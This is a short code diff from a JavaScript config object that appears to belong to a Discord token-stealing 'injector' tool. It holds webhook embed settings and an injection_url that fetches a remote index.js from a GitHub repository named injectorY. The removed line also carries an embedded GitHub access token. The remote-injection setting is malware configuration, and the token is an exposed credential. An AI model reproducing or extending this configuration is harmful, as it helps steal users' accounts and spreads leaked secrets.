@@ -14,7 +14,7 @@ const config = {
   embed_name: 'DoubleYy', 
   embed_icon: 'https://art.ngfiles.com/images/1828000/1828435_dmh-but-not_hot-boy-summer-neon.png?f1621350903'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/LorenzoTomazz/injectorY/main/index.js?token=GHSAT0AAAAAACJWHAA2M6NLE4LK2CVVCZ24ZNAKCQA', 
+  injection_url: 'https://raw.githubusercontent.com/LorenzoTomazz/injectorY/main/index.js', 
   /**
    
    **/
